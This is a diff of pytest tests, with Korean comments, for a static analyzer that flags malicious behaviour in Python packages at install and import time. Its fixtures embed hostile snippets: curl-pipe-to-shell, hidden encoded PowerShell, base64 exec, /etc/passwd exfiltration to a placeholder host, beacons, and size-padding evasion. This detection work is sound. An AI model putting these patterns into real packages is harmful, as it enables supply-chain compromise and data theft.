@@ -734,8 +734,29 @@ def test_oversized_setup_py_is_still_scanned():
     pad = "#" + "x" * (3 * 1024 * 1024) + "\n"
     src = "from base64 import b64decode\nexec(b64decode(P).decode())\n" + pad
     assert RULE_OBFUSCATED in _high_rules({"p-1/setup.py": src})
-    # 진입점이 아닌 큰 모듈은 예전처럼 건너뛴다 (생성된 표·데이터)
-    assert _high_rules({"p-1/pkg/table.py": src}) == set()
+
+
+def test_oversized_module_imported_by_init_is_still_scanned():
+    """진입점이 아닌 모듈도 2MB 를 넘겼다고 빠지면 안 된다 — __init__ 이 import 하는 모듈에
+    페이로드를 넣고 부풀리면 검사에서 사라지는 우회로였다."""
+    pad = "#" + "x" * (3 * 1024 * 1024) + "\n"
+    files = {"p-1/setup.py": "", "p-1/pkg/__init__.py": "from . import payload\n",
+             "p-1/pkg/payload.py": "import requests\nrequests.post('http://x')\n" + pad}
+    assert RULE_INSTALL_TIME in _high_rules(files)
+
+
+def test_code_file_over_the_cap_is_reported_not_skipped(monkeypatch):
+    from engine import static_analyzer as sa
+
+    monkeypatch.setattr(sa, "MAX_CODE_BYTES", 100)
+    unreadable: list[str] = []
+    files = {"p-1/pkg/__init__.py": "x = 1\n" * 50, "p-1/data.txt": "y" * 5000}
+    sa.analyze_files(files, unreadable=unreadable)
+    assert unreadable == ["p-1/pkg/__init__.py" + sa.OVERSIZED_MARK]  # .txt 는 데이터라 조용히
+    [msg] = sa.unreadable_errors(unreadable)
+    assert msg.startswith("static: ") and "p-1/pkg/__init__.py" in msg and "상한" in msg
+    # 읽기 실패와 함께 오면 문구가 둘로 나뉜다
+    assert len(sa.unreadable_errors([*unreadable, "p-1/a.py"])) == 2
 
 
 # ── held-out 에서 놓친 두 계열 ──────────────────────────────────────
@@ -816,3 +837,621 @@ def test_local_module_finding_points_at_the_module_not_setup_py():
     }
     [f] = [f for f in analyze_files(files) if f.rule == RULE_INSTALL_TIME]
     assert f.location == "p-1/helper.py:3"
+
+
+# ── import 시점 범위 확장 — 파일 경계를 넘는 실행 경로 (탈취 패키지 실측 구조) ──────
+
+_NET = "import requests\n"
+_INIT = {"p-1/setup.py": ""}
+
+
+from engine.rules.install_time import RULE_INDIRECT_NET  # noqa: E402
+
+
+def _install_time_findings(files: dict[str, str]):
+    roots = {k.split("/")[0] for k in files if k.endswith("/setup.py")}
+    files = {**{f"{r}/PKG-INFO": "Name: p" for r in roots}, **files}
+    return [f for f in analyze_files(files) if f.rule in (RULE_INSTALL_TIME, RULE_INDIRECT_NET)]
+
+
+def _install_time_locations(files: dict[str, str]) -> set[str]:
+    return {f.location for f in _install_time_findings(files)}
+
+
+@pytest.mark.parametrize(
+    ("files", "where"),
+    [
+        # 상대 import 한 형제 모듈의 함수를 최상단에서 부른다
+        ({**_INIT, "p-1/pkg/__init__.py": "from .util import boot\nboot()\n",
+          "p-1/pkg/util.py": _NET + "def boot():\n    requests.post('http://x')\n"},
+         "p-1/pkg/util.py:3"),
+        # memoryos 2.0.34 구조 — 모든 모듈의 logger = get_logger() → 다른 모듈 → 또 다른 모듈
+        ({**_INIT, "p-1/memos/__init__.py": "",
+          "p-1/memos/core.py": "from memos.log import get_logger\nlogger = get_logger(__name__)\n",
+          "p-1/memos/log.py": "def configure():\n    from memos._stage0 import trigger\n"
+                              "    trigger()\ndef get_logger(n):\n    configure()\n    return n\n",
+          "p-1/memos/_stage0.py": _NET + "def trigger():\n    requests.get('http://x')\n"},
+         "p-1/memos/_stage0.py:3"),
+        # 패키지 __init__ 의 재수출을 거쳐 부른다
+        ({**_INIT, "p-1/pkg/__init__.py": "from .impl import go\n",
+          "p-1/pkg/mod.py": "from pkg import go\ngo()\n",
+          "p-1/pkg/impl.py": _NET + "def go():\n    requests.get('http://x')\n"},
+         "p-1/pkg/impl.py:3"),
+        # 최상단 인스턴스화 → __init__ → self 메서드
+        ({**_INIT, "p-1/pkg/__init__.py": _NET + "class C:\n    def __init__(self):\n"
+          "        self._load()\n    def _load(self):\n        requests.get('http://x')\n"
+          "client = C()\n"},
+         "p-1/pkg/__init__.py:6"),
+        # 최상단 인스턴스의 메서드 호출 (다른 모듈의 클래스)
+        ({**_INIT, "p-1/pkg/__init__.py": "from .svc import Svc\ns = Svc()\ns.start_up()\n",
+          "p-1/pkg/svc.py": _NET + "class Svc:\n    def start_up(self):\n"
+          "        requests.get('http://x')\n"},
+         "p-1/pkg/svc.py:4"),
+        # lightning 2.6.2 구조 — 스레드에 넘긴 함수
+        ({**_INIT, "p-1/pkg/__init__.py": "import threading\n" + _NET +
+          "def _run():\n    requests.get('http://x')\n"
+          "threading.Thread(target=_run, daemon=True).start()\n"},
+         "p-1/pkg/__init__.py:4"),
+        # 종료 훅 — 호출형·데코레이터형
+        ({**_INIT, "p-1/pkg/__init__.py": "import atexit\n" + _NET +
+          "def _bye():\n    requests.post('http://x')\natexit.register(_bye)\n"},
+         "p-1/pkg/__init__.py:4"),
+        ({**_INIT, "p-1/pkg/__init__.py": "import atexit\n" + _NET +
+          "@atexit.register\ndef _bye():\n    requests.post('http://x')\n"},
+         "p-1/pkg/__init__.py:5"),
+        # Thread 하위 클래스의 start() → run()
+        ({**_INIT, "p-1/pkg/__init__.py": "import threading\n" + _NET +
+          "class W(threading.Thread):\n    def run(self):\n        requests.get('http://x')\n"
+          "W().start()\n"},
+         "p-1/pkg/__init__.py:5"),
+        # 클래스 본문은 정의(= import) 순간 실행된다
+        ({**_INIT, "p-1/pkg/__init__.py": _NET + "class Cfg:\n    T = requests.get('http://x')\n"},
+         "p-1/pkg/__init__.py:3"),
+        # setup.py 가 상대 경로 없이 src/ 의 패키지 함수를 부른다
+        ({"p-1/setup.py": "from mypkg.boot import go\ngo()\n", "p-1/src/mypkg/__init__.py": "",
+          "p-1/src/mypkg/boot.py": _NET + "def go():\n    requests.get('http://x')\n"},
+         "p-1/src/mypkg/boot.py:3"),
+    ],
+)
+def test_import_time_scope_follows_real_execution_paths(files, where):
+    [f] = [f for f in _install_time_findings(files) if f.location == where]
+    # 확장 범위의 네트워크는 MEDIUM — 정상 패키지도 여기서 통신한다 (litellm·elementary-data
+    # ·memoryos 직전 정상 버전, lxml). 새 릴리스에 처음 나타나면 version_diff 가 올린다.
+    # setup.py 가 로컬 모듈 함수를 직접 부르는 경로(예전 범위)만 HIGH 다.
+    direct = files.get("p-1/setup.py", "").startswith("from mypkg")
+    assert f.severity is (Severity.HIGH if direct else Severity.MEDIUM)
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        # 다른 모듈 경유여도 수상한 명령은 HIGH 그대로
+        {**_INIT, "p-1/pkg/__init__.py": "from .boot import go\ngo()\n",
+         "p-1/pkg/boot.py": "import subprocess\ndef go():\n"
+                            "    subprocess.Popen('curl http://x | sh', shell=True)\n"},
+        {**_INIT, "p-1/pkg/__init__.py": "import threading, os\n"
+         "def _r():\n    os.system('powershell -w hidden -enc AAAA')\n"
+         "threading.Thread(target=_r).start()\n"},
+    ],
+)
+def test_suspicious_command_in_extended_scope_stays_high(files):
+    assert RULE_INSTALL_TIME in _high_rules(files)
+
+
+def test_same_line_reached_directly_and_indirectly_is_reported_once_as_high():
+    files = {**_INIT, "p-1/pkg/__init__.py": _NET + "def go():\n    requests.get('http://x')\n"
+             "go()\n", "p-1/pkg/other.py": "from pkg import go\ngo()\n"}
+    found = [f for f in _install_time_findings(files) if f.location == "p-1/pkg/__init__.py:3"]
+    assert [(f.rule, f.severity) for f in found] == [(RULE_INSTALL_TIME, Severity.HIGH)]
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        # 다른 모듈에 함수가 있어도 import 시점에 부르지 않으면 범위 밖
+        {**_INIT, "p-1/pkg/__init__.py": "from .util import fetch\n",
+         "p-1/pkg/util.py": _NET + "def fetch():\n    return requests.get('http://x')\n"},
+        # 인스턴스화하지 않은 클래스, 부르지 않은 메서드
+        {**_INIT, "p-1/pkg/__init__.py": "from .svc import Svc\ns = Svc()\n",
+         "p-1/pkg/svc.py": _NET + "class Svc:\n    def fetch(self):\n"
+                                  "        return requests.get('http://x')\n"},
+        # 실행해 주지 않는 곳에 넘긴 함수 (콜백 등록) — 이벤트가 올 때 돈다
+        {**_INIT, "p-1/pkg/__init__.py": "import signal\n" + _NET +
+         "def _h(*a):\n    requests.get('http://x')\nsignal.signal(signal.SIGTERM, _h)\n"},
+        # 데코레이터 안의 래퍼 함수는 장식된 함수를 부를 때 돈다
+        {**_INIT, "p-1/pkg/__init__.py": _NET + "def retry(fn):\n    def w(*a):\n"
+         "        requests.get('http://x')\n        return fn(*a)\n    return w\n"
+         "@retry\ndef api():\n    pass\n"},
+    ],
+)
+def test_import_time_scope_does_not_widen_to_any_function(files):
+    assert _install_time_locations(files) == set()
+
+
+def test_cross_module_finding_is_reported_once():
+    """같은 함수를 여러 모듈이 부르면 위치 하나로 한 번만 보고한다 (memoryos: 수백 모듈)."""
+    files = {**_INIT, "p-1/pkg/__init__.py": "",
+             **{f"p-1/pkg/m{i}.py": "from pkg.log import get\nget()\n" for i in range(5)},
+             "p-1/pkg/log.py": _NET + "def get():\n    requests.get('http://x')\n"}
+    hits = [f for f in analyze_files(files) if f.rule == RULE_INDIRECT_NET]
+    assert [f.location for f in hits] == ["p-1/pkg/log.py:3"]
+
+
+# ── 수상 토큰 없는 설치·import 시점 프로세스 실행 (MEDIUM) ─────────────────
+
+from engine.rules.install_time import RULE_INSTALL_SPAWN  # noqa: E402
+
+
+def _spawn_findings(files: dict[str, str]):
+    roots = {k.split("/")[0] for k in files if k.endswith("/setup.py")}
+    files = {**{f"{r}/PKG-INFO": "Name: p" for r in roots}, **files}
+    return [f for f in analyze_files(files) if f.rule == RULE_INSTALL_SPAWN]
+
+
+@pytest.mark.parametrize(
+    ("files", "head"),
+    [
+        # lightning 2.6.2 — import 시 스레드에서 번들 스크립트를 파이썬으로 띄운다
+        ({**_INIT, "p-1/pkg/__init__.py":
+          "import os, subprocess, sys, threading\n"
+          "def _run():\n    s = os.path.join(os.path.dirname(__file__), '_runtime', 'start.py')\n"
+          "    subprocess.Popen([sys.executable, s], stdout=subprocess.DEVNULL)\n"
+          "threading.Thread(target=_run, daemon=True).start()\n"}, "python"),
+        # memoryos 2.0.34 — 실행 권한을 주고 번들 바이너리를 실행 (다른 모듈 경유)
+        ({**_INIT, "p-1/memos/__init__.py": "from memos.log import get_logger\nL = get_logger()\n",
+          "p-1/memos/log.py": "def get_logger():\n    from memos._stage0 import trigger\n"
+                              "    trigger()\n",
+          "p-1/memos/_stage0.py": "import subprocess\nfrom pathlib import Path\ndef trigger():\n"
+                                  "    b = Path(__file__).parent / 'sckit'\n    b.chmod(0o700)\n"
+                                  "    subprocess.Popen([str(b), 'stage0'])\n"}, "?"),
+        # setup.py 최상단의 평범한 명령 문자열
+        ({"p-1/setup.py": "import os\nos.system('python helper.py')\n"}, "python"),
+    ],
+)
+def test_install_time_spawn_without_token_is_medium(files, head):
+    [f] = _spawn_findings(files)
+    assert f.severity is Severity.MEDIUM
+    assert f"명령 '{head}'" in f.detail
+    # MEDIUM 만으로는 차단하지 않는다 (정상 라이브러리도 import 시 프로세스를 띄운다)
+    assert RULE_INSTALL_TIME not in _high_rules(files)
+
+
+@pytest.mark.parametrize(
+    "src",
+    [
+        "import subprocess\nv = subprocess.check_output(['git', 'describe', '--tags'])\n",
+        "import subprocess\nsubprocess.run('nvidia-smi -L', shell=True)\n",
+        "import subprocess\nsubprocess.check_call([r'C:\\VS\\cl.exe', '/?'])\n",
+        "import os\nos.system('uname -a')\n",
+        # 함수 안 — 부르지 않으면 범위 밖
+        "import subprocess\ndef build():\n    subprocess.run(['python', 'x.py'])\n",
+    ],
+)
+def test_ordinary_build_and_probe_commands_are_not_reported(src):
+    assert _spawn_findings({"p-1/setup.py": src}) == []
+
+
+def test_suspicious_spawn_stays_high_and_is_not_double_reported():
+    files = {"p-1/setup.py": "import subprocess\nsubprocess.Popen('powershell -w hidden x')\n"}
+    assert _spawn_findings(files) == []
+    assert RULE_INSTALL_TIME in _high_rules(files)
+
+
+# ── 직전 릴리스 대비 새 행위 (engine/version_diff.py) ──────────────────────
+
+import asyncio  # noqa: E402
+import io  # noqa: E402
+import tarfile  # noqa: E402
+
+from api.schemas import StaticFinding  # noqa: E402
+from common.pypi import PackageContext, ProjectData  # noqa: E402
+from engine import version_diff as vd  # noqa: E402
+
+_LIGHTNING_INIT = (
+    "import os, subprocess, sys, threading\n"
+    "def _run():\n    s = os.path.join(os.path.dirname(__file__), '_runtime', 'start.py')\n"
+    "    subprocess.Popen([sys.executable, s])\n"
+    "threading.Thread(target=_run, daemon=True).start()\n"
+)
+
+
+def _findings(root: str, files: dict[str, str]) -> list[StaticFinding]:
+    files = {f"{root}/{k}": v for k, v in files.items()}
+    files[f"{root}/PKG-INFO"] = "Name: p"
+    return analyze_files(files)
+
+
+def test_new_spawn_is_escalated_to_high():
+    old = _findings("lightning-2.6.1", {"setup.py": "", "lightning/__init__.py": "import os\n"})
+    new = _findings("lightning-2.6.2", {"setup.py": "", "lightning/__init__.py": _LIGHTNING_INIT})
+    [extra] = vd.new_behaviors(new, old)
+    assert extra.rule == vd.RULE_NEW_BEHAVIOR and extra.severity is Severity.HIGH
+    assert extra.location == "lightning-2.6.2/lightning/__init__.py:4"
+    assert "명령 'python'" in extra.detail
+
+
+def test_existing_spawn_is_not_escalated_even_if_moved():
+    """줄번호·sdist 루트·파일 위치가 바뀌어도 같은 행위면 새 것이 아니다."""
+    old = _findings("p-1.0", {"setup.py": "", "p/__init__.py": _LIGHTNING_INIT})
+    new = _findings("p-1.1", {"setup.py": "", "p/__init__.py": "\n# moved\nfrom ._boot import x\n",
+                              "p/_boot.py": "x = 1\n" + _LIGHTNING_INIT})
+    assert any(f.rule == RULE_INSTALL_SPAWN for f in new)
+    assert vd.new_behaviors(new, old) == []
+
+
+def test_new_high_behavior_is_annotated_and_old_one_is_not():
+    net = "import requests\nrequests.get('http://x')\n"
+    old = _findings("p-1.0", {"setup.py": "", "p/__init__.py": net})
+    new = _findings("p-1.1", {"setup.py": "", "p/__init__.py": net,
+                              "p/x.pth": "import os; os.system('id')\n"})
+    extra = vd.new_behaviors(new, old)
+    assert [f.location for f in extra] == ["p-1.1/p/x.pth:1"]
+    assert "처음 나타남" in extra[0].detail
+
+
+def test_ordinary_medium_findings_are_not_candidates():
+    new = _findings("p-1.1", {"setup.py": "", "p/__init__.py": "def f(s):\n    return eval(s)\n"})
+    assert not vd.has_candidates(new)
+    assert vd.new_behaviors(new, []) == []
+
+
+def _project(releases: dict[str, tuple[str, bool]]) -> ProjectData:
+    return ProjectData(name="p", releases={
+        v: [{"filename": f"p-{v}.tar.gz", "packagetype": "sdist", "yanked": y,
+             "url": f"https://files/p-{v}.tar.gz", "upload_time_iso_8601": t}]
+        for v, (t, y) in releases.items()
+    })
+
+
+def test_previous_version_is_by_upload_time_and_skips_yanked():
+    proj = _project({
+        "1.0": ("2024-01-01T00:00:00Z", False),
+        "2.0": ("2024-03-01T00:00:00Z", False),
+        "1.1": ("2024-04-01T00:00:00Z", False),   # 백포트 — 번호는 작아도 2.0 보다 늦다
+        "2.1": ("2024-05-01T00:00:00Z", True),    # 철회된 악성 릴리스
+        "2.2": ("2024-05-02T00:00:00Z", False),
+    })
+    assert vd.previous_version(proj, "2.2") == "1.1"
+    assert vd.previous_version(proj, "1.0") is None  # 첫 릴리스
+    # 메타데이터에서 지워진 릴리스는 기준 시각(발견일)으로
+    from datetime import UTC, datetime
+    assert vd.previous_version(proj, "9.9", before=datetime(2024, 3, 15, tzinfo=UTC)) == "2.0"
+
+
+def _sdist(root: str, files: dict[str, str]) -> bytes:
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
+        for rel, text in {"PKG-INFO": "Name: p", **files}.items():
+            data = text.encode()
+            info = tarfile.TarInfo(f"{root}/{rel}")
+            info.size = len(data)
+            tf.addfile(info, io.BytesIO(data))
+    return buf.getvalue()
+
+
+def _ctx(handler) -> PackageContext:
+    client = httpx.AsyncClient(transport=httpx.MockTransport(handler))
+    return PackageContext("p", "2.0", client=client)
+
+
+def _project_json(versions: dict[str, str]) -> dict:
+    return {"info": {"name": "p"}, "releases": {
+        v: [{"filename": f"p-{v}.tar.gz", "packagetype": "sdist", "yanked": False,
+             "url": f"https://files.example/p-{v}.tar.gz", "upload_time_iso_8601": t}]
+        for v, t in versions.items()}}
+
+
+def test_escalate_downloads_previous_release_and_returns_only_additions():
+    new = _findings("p-2.0", {"setup.py": "", "p/__init__.py": _LIGHTNING_INIT})
+    calls: list[str] = []
+
+    def handler(req: httpx.Request) -> httpx.Response:
+        calls.append(req.url.path)
+        if req.url.path == "/pypi/p/json":
+            return httpx.Response(200, json=_project_json(
+                {"1.0": "2024-01-01T00:00:00Z", "2.0": "2024-02-01T00:00:00Z"}))
+        assert req.url.path == "/p-1.0.tar.gz"
+        return httpx.Response(200, content=_sdist("p-1.0", {"setup.py": "",
+                                                            "p/__init__.py": "x = 1\n"}))
+
+    errors: list[str] = []
+    extra = asyncio.run(vd.escalate_new_behaviors(_ctx(handler), new, errors=errors))
+    assert errors == []
+    assert [f.rule for f in extra] == [vd.RULE_NEW_BEHAVIOR]
+    assert calls == ["/pypi/p/json", "/p-1.0.tar.gz"]
+
+
+def test_escalate_makes_no_request_without_candidates():
+    def handler(req: httpx.Request) -> httpx.Response:  # pragma: no cover - 불리면 실패
+        raise AssertionError(f"unexpected request {req.url}")
+
+    clean = _findings("p-2.0", {"setup.py": "", "p/__init__.py": "x = 1\n"})
+    assert asyncio.run(vd.escalate_new_behaviors(_ctx(handler), clean, errors=[])) == []
+
+
+def test_escalate_on_first_release_does_nothing():
+    def handler(req: httpx.Request) -> httpx.Response:
+        assert req.url.path == "/pypi/p/json"
+        return httpx.Response(200, json=_project_json({"2.0": "2024-02-01T00:00:00Z"}))
+
+    new = _findings("p-2.0", {"setup.py": "", "p/__init__.py": _LIGHTNING_INIT})
+    errors: list[str] = []
+    assert asyncio.run(vd.escalate_new_behaviors(_ctx(handler), new, errors=errors)) == []
+    assert errors == []
+
+
+def test_escalate_reports_failure_to_fetch_previous_release():
+    def handler(req: httpx.Request) -> httpx.Response:
+        if req.url.path == "/pypi/p/json":
+            return httpx.Response(200, json=_project_json(
+                {"1.0": "2024-01-01T00:00:00Z", "2.0": "2024-02-01T00:00:00Z"}))
+        return httpx.Response(503)
+
+    new = _findings("p-2.0", {"setup.py": "", "p/__init__.py": _LIGHTNING_INIT})
+    errors: list[str] = []
+    assert asyncio.run(vd.escalate_new_behaviors(_ctx(handler), new, errors=errors)) == []
+    [msg] = errors
+    assert msg.startswith("static: ") and "1.0" in msg
+
+
+# ── 콘솔 스크립트 진입점 ─────────────────────────────────────────────
+
+from engine.rules.install_time import RULE_ENTRYPOINT  # noqa: E402
+
+_PS = "import subprocess\ndef main():\n    subprocess.Popen('powershell -w hidden -enc AAAA')\n"
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        {"p-1/pyproject.toml": "[project]\nname='p'\n[project.scripts]\np = 'p.cli:main'\n",
+         "p-1/src/p/__init__.py": "", "p-1/src/p/cli.py": _PS},
+        {"p-1/setup.py": "setup(entry_points={'console_scripts': ['p=p.cli:main']})\n",
+         "p-1/p/__init__.py": "", "p-1/p/cli.py": _PS},
+        {"p.dist-info/entry_points.txt": "[console_scripts]\np = p.cli:main\n",
+         "p/__init__.py": "", "p/cli.py": _PS},
+    ],
+)
+def test_entrypoint_running_suspicious_command_is_medium_context(files):
+    """사용자가 실행하는 CLI — 실제 악성 0건·신규 업로드 오탐 4건이라 정황(MEDIUM)으로만."""
+    hits = [f for f in analyze_files({"p-1/PKG-INFO": "Name: p", **files})
+            if f.rule == RULE_ENTRYPOINT]
+    assert len(hits) == 1 and hits[0].severity is Severity.MEDIUM
+    assert hits[0].location.endswith("p/cli.py:3")
+
+
+def test_entrypoint_network_call_is_normal():
+    files = {"p-1/PKG-INFO": "Name: p",
+             "p-1/pyproject.toml": "[project.scripts]\np = 'p.cli:main'\n",
+             "p-1/p/__init__.py": "",
+             "p-1/p/cli.py": "import requests\ndef main():\n    requests.get('https://api')\n"}
+    assert not {f.rule for f in analyze_files(files)} & {RULE_ENTRYPOINT, RULE_INSTALL_TIME}
+
+
+def test_new_indirect_network_call_is_escalated_but_existing_one_is_not():
+    """litellm 처럼 import 시 확장 범위에서 통신하던 패키지는 그대로, 새로 생기면 HIGH."""
+    boot = {"setup.py": "", "p/__init__.py": "from .cost import load\nM = load()\n",
+            "p/cost.py": "import httpx\ndef load():\n    return httpx.get('https://x').json()\n"}
+    plain = {"setup.py": "", "p/__init__.py": "M = {}\n"}
+    old_with = _findings("p-1.0", boot)
+    new_with = _findings("p-1.1", boot)
+    assert {f.rule for f in new_with} >= {RULE_INDIRECT_NET}
+    assert vd.new_behaviors(new_with, old_with) == []
+    [extra] = vd.new_behaviors(new_with, _findings("p-1.0", plain))
+    assert extra.severity is Severity.HIGH and extra.location == "p-1.1/p/cost.py:3"
+
+
+@pytest.mark.parametrize(
+    ("cmd", "high"),
+    [
+        # ultralytics 8.3.40 — yolo 명령의 내려받기 재시도 (정상)
+        ("subprocess.run(['curl', '-#', '-L', url, '-o', f])", False),
+        ("subprocess.run('curl -fsSL http://x | sh', shell=True)", True),
+    ],
+)
+def test_entrypoint_downloader_alone_is_normal(cmd, high):
+    files = {"p-1/PKG-INFO": "Name: p",
+             "p-1/pyproject.toml": "[project.scripts]\np = 'p.cli:main'\n",
+             "p-1/p/__init__.py": "",
+             "p-1/p/cli.py": f"import subprocess\ndef main(url='u', f='o'):\n    {cmd}\n"}
+    assert (RULE_ENTRYPOINT in {f.rule for f in analyze_files(files)}) is high
+
+
+# ── 신규 업로드 실측 오탐 (docs/eval/watch-new-uploads.md) ──────────────────
+
+_WHEEL = {"p-1.dist-info/WHEEL": "Wheel-Version: 1.0\n"}
+
+
+def _pth(files: dict[str, str]):
+    return [f for f in analyze_files(files) if f.rule == RULE_PTH]
+
+
+def test_pth_importing_own_module_is_medium_and_module_is_still_checked():
+    """dagz·quantark 등 — 자기 배포물 모듈을 import 하는 한 줄은 의도된 시작 훅이다.
+    대신 그 모듈의 최상단은 (휠 루트 단일 모듈이어도) import 시점 코드로 검사한다."""
+    files = {**_WHEEL, "zzzz_p_bootstrap.pth": "import _p_startup\n",
+             "_p_startup.py": "x = 1\n"}
+    [f] = _pth(files)
+    assert f.severity is Severity.MEDIUM
+    files["_p_startup.py"] = "import requests\nrequests.post('http://x', data='h')\n"
+    assert RULE_INSTALL_TIME in {f.rule for f in analyze_files(files)
+                                 if f.severity is Severity.HIGH}
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "import _p_startup; _p_startup.go()",          # 인라인 코드가 붙음
+        "import os, subprocess; os.system('id')",
+        "import evil_not_in_this_dist",                 # 같은 배포물에 없는 모듈
+        "import base64;exec(base64.b64decode('aWQ='))",
+    ],
+)
+def test_pth_with_code_or_foreign_import_stays_high(line):
+    files = {**_WHEEL, "x.pth": line + "\n", "_p_startup.py": "x = 1\n"}
+    assert [f.severity for f in _pth(files)] == [Severity.HIGH]
+
+
+from engine.rules.install_time import RULE_BENIGN_NET  # noqa: E402
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        # rubka·sigmaflow — import 시 PyPI 로 최신 버전 확인
+        {**_INIT, "p-1/pkg/__init__.py": "import requests\n"
+         "def _check():\n    requests.get(f'https://pypi.org/pypi/{__name__}/json', timeout=2)\n"
+         "_check()\n"},
+        {**_INIT, "p-1/pkg/__init__.py": "import socket\n"
+         "socket.create_connection(('localhost', 11434), timeout=0.2)\n"},
+        # ai-edge-litert-sdk-* — setup.py 가 SDK 를 받기만 하고 실행하지 않는다
+        {"p-1/setup.py": "from urllib.request import urlretrieve\nURL = 'https://x/sdk.tgz'\n"
+                         "urlretrieve(URL, 'vendor/sdk.tgz')\nsetup(name='p')\n"},
+    ],
+)
+def test_version_check_and_download_only_are_medium(files):
+    found = _install_time_findings(files) + [
+        f for f in analyze_files({"p-1/PKG-INFO": "Name: p", **files}) if f.rule == RULE_BENIGN_NET]
+    assert any(f.rule == RULE_BENIGN_NET for f in found)
+    assert RULE_INSTALL_TIME not in _high_rules(files)
+
+
+@pytest.mark.parametrize(
+    "src",
+    [
+        # 받아서 실행 — 같은 setup.py 범위에 실행이 있다
+        "from urllib.request import urlretrieve\nimport os\n"
+        "urlretrieve('https://x/a.bin', 'a.bin')\nos.startfile('a.bin')\n",
+        "from urllib.request import urlretrieve\nimport subprocess\n"
+        "urlretrieve('https://x/a', '/tmp/a')\nsubprocess.Popen(['/tmp/a'])\n",
+        # 실행 파일·시작 프로그램 폴더로 저장 (다음 로그인 때 실행)
+        "from urllib.request import urlretrieve\nurlretrieve('https://x/u', 'update.exe')\n",
+        # 호스트 정보를 실어 보낼 수 있게 URL 을 조립
+        "import socket\nfrom urllib.request import urlretrieve\n"
+        "urlretrieve('https://x/?h=' + socket.gethostname(), 'f')\n",
+        # 상수 주소 GET — 의존성 혼동 PoC 의 비콘 형태
+        "import requests\nrequests.get('https://abc.oastify.com')\n",
+        # PyPI 가 아닌 곳으로 보내는 버전 확인 모양
+        "import requests\nrequests.get('https://pypi.org.evil.example/x')\n",
+    ],
+)
+def test_download_then_run_or_beacon_stays_high(src):
+    assert RULE_INSTALL_TIME in _high_rules({"p-1/setup.py": src})
+
+
+def _vendored(source: str, ns: str = ", multiCMD.__dict__") -> str:
+    import base64
+    import lzma
+
+    blob = base64.a85encode(lzma.compress(source.encode())).decode()
+    return (f"import base64, lzma, types\nmultiCMD = types.ModuleType('multiCMD')\n"
+            f"exec(lzma.decompress(base64.a85decode({blob!r})){ns})\n")
+
+
+_LIB = "import subprocess\ndef run(cmd):\n    return subprocess.run(cmd, shell=True)\n"
+
+
+def _obf(src: str):
+    return [f for f in analyze_files({"p-1/setup.py": "", "p-1/PKG-INFO": "Name: p",
+                                      "p-1/hpcp.py": src}) if f.rule == RULE_OBFUSCATED]
+
+
+def test_vendored_library_blob_into_module_namespace_is_medium():
+    """hpcp·statblk·statbtrfs — 자기 라이브러리를 다른 모듈 네임스페이스에 심는다. 해독해 보니
+    함수 정의뿐(subprocess 는 함수 안)이라 import 시점 위험 행위가 없다."""
+    assert [f.severity for f in _obf(_vendored(_LIB))] == [Severity.MEDIUM]
+
+
+@pytest.mark.parametrize(
+    ("source", "ns"),
+    [
+        (_LIB, ""),                                   # 네임스페이스 없이 exec — 그대로 HIGH
+        (_LIB, ", globals()"),
+        ("import requests\nrequests.post('http://x', data=open('/etc/passwd').read())\n",
+         ", multiCMD.__dict__"),                      # 해독된 소스가 import 시점에 유출
+        ("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n", ", multiCMD.__dict__"),
+        ("import os\nos.system('curl http://x | sh')\n", ", multiCMD.__dict__"),
+    ],
+)
+def test_blob_that_acts_at_import_or_runs_in_globals_stays_high(source, ns):
+    assert Severity.HIGH in [f.severity for f in _obf(_vendored(source, ns))]
+
+
+def test_install_hook_that_only_downloads_is_medium():
+    """haddock3 — install 훅이 데이터 파일을 내려받기만 한다."""
+    src = ("from setuptools.command.install import install\n"
+           "from urllib.request import urlretrieve\n"
+           "class I(install):\n    def run(self):\n        urlretrieve('https://x/data.bin', 'd')\n"
+           "        install.run(self)\nsetup(cmdclass={'install': I})\n")
+    hooks = [f for f in analyze_files({"p-1/PKG-INFO": "Name: p", "p-1/setup.py": src})
+             if f.rule == RULE_INSTALL_HOOK]
+    assert [f.severity for f in hooks] == [Severity.MEDIUM]
+    assert _high_rules({"p-1/setup.py": src}) == set()
+    # 받고 실행하면 둘 다 HIGH
+    run = src.replace("        install.run(self)\n",
+                      "        import os; os.system('./d')\n        install.run(self)\n")
+    assert {RULE_INSTALL_HOOK, RULE_INSTALL_TIME} <= _high_rules({"p-1/setup.py": run})
+
+
+def test_pth_loading_a_flagged_own_module_stays_high():
+    """.pth 가 자기 모듈을 import 해도 그 모듈에 HIGH 가 있으면 지속성 장치라 HIGH
+    (samples/sample5_mcp_typosquat 구조)."""
+    files = {**_WHEEL, "p.pth": "import p._telemetry\n", "p/__init__.py": "",
+             "p/_telemetry.py": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"}
+    assert [f.severity for f in _pth(files)] == [Severity.HIGH]
+
+
+@pytest.mark.parametrize(
+    ("files", "sev"),
+    [
+        # dagz — 자기 모듈 함수를 부르는 시작 훅, 그 함수는 조용하다
+        ({**_WHEEL, "zzzz_d.pth": "import d.sensor.boot; d.sensor.boot.bootstrap()\n",
+          "d/__init__.py": "", "d/sensor/__init__.py": "",
+          "d/sensor/boot.py": "import sys\ndef bootstrap():\n    sys.setprofile(None)\n"},
+         Severity.MEDIUM),
+        # nvidia-cutlass-dsl — 경로 추가
+        ({**_WHEEL, "n.pth": "import sys, os, n; sys.path.insert(0, os.path.join("
+          "n.__path__[0], 'pk'))\n", "n/__init__.py": ""}, Severity.MEDIUM),
+        # 부르는 자기 모듈 함수가 프로세스를 띄운다
+        ({**_WHEEL, "g.pth": "import g; g.install()\n",
+          "g/__init__.py": "import subprocess\ndef install():\n    subprocess.Popen(['x'])\n"},
+         Severity.HIGH),
+        # 다른 모듈의 함수를 부른다
+        ({**_WHEEL, "g.pth": "import g, os; os.system('id')\n", "g/__init__.py": ""},
+         Severity.HIGH),
+    ],
+)
+def test_pth_startup_hook_forms(files, sev):
+    assert [f.severity for f in _pth(files)] == [sev]
+
+
+@pytest.mark.parametrize(
+    ("src", "high"),
+    [
+        # rubka — 지역 변수에 담은 PyPI 주소
+        ("import requests\ndef latest(n):\n    url = f'https://pypi.org/pypi/{n}/json'\n"
